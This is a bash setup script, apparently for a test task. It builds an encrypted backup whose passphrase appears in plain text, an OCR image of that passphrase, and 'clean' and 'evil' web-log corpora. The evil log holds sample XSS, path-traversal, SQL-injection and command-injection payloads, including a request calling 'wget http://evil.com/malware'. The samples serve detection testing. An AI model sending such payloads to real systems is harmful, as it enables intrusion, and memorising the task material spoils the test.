#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip tesseract-ocr openssl imagemagick fonts-dejavu-core tar gzip
    pip3 install pytest

    # Create directories
    mkdir -p /app/corpus/clean /app/corpus/evil /home/user/.ssh

    # Generate passphrase image
    convert -size 400x100 xc:white -font DejaVu-Sans -pointsize 24 -fill black -draw "text 10,50 'B@ckup_S3cur3_2024!'" /app/passphrase.png

    # Generate encrypted backup
    mkdir -p /tmp/backup_contents
    echo "important backup data" > /tmp/backup_contents/data.txt
    tar -czf /home/user/backup.tar.gz -C /tmp backup_contents
    openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:'B@ckup_S3cur3_2024!' -in /home/user/backup.tar.gz -out /home/user/backup.enc
    rm /home/user/backup.tar.gz

    # Create clean corpus
    cat << 'EOF' > /app/corpus/clean/normal_logs.txt
192.168.1.10 - - [10/Oct/2023:13:55:36 -0700] "GET /index.html HTTP/1.1" 200 1043
192.168.1.11 - - [10/Oct/2023:13:56:01 -0700] "POST /api/login HTTP/1.1" 200 45
192.168.1.12 - - [10/Oct/2023:13:57:12 -0700] "GET /images/logo.png HTTP/1.1" 200 4012
EOF

    # Create evil corpus
    cat << 'EOF' > /app/corpus/evil/exploit_logs.txt
192.168.1.20 - - [10/Oct/2023:14:01:00 -0700] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 512
192.168.1.21 - - [10/Oct/2023:14:02:15 -0700] "GET /download?file=../../../../etc/passwd HTTP/1.1" 404 123
192.168.1.22 - - [10/Oct/2023:14:03:45 -0700] "GET /items?id=1 UNION SELECT username, password FROM users HTTP/1.1" 500 89
192.168.1.23 - - [10/Oct/2023:14:04:10 -0700] "GET /ping?ip=127.0.0.1;$(whoami) HTTP/1.1" 200 30
192.168.1.24 - - [10/Oct/2023:14:05:00 -0700] "GET /test?cmd=`id` HTTP/1.1" 200 45
192.168.1.25 - - [10/Oct/2023:14:06:00 -0700] "GET /shell?c=wget http://evil.com/malware HTTP/1.1" 200 10
EOF

    # Create user and set permissions
    useradd -m -s /bin/bash user || true
    chown -R user:user /home/user
    chmod -R 777 /home/user
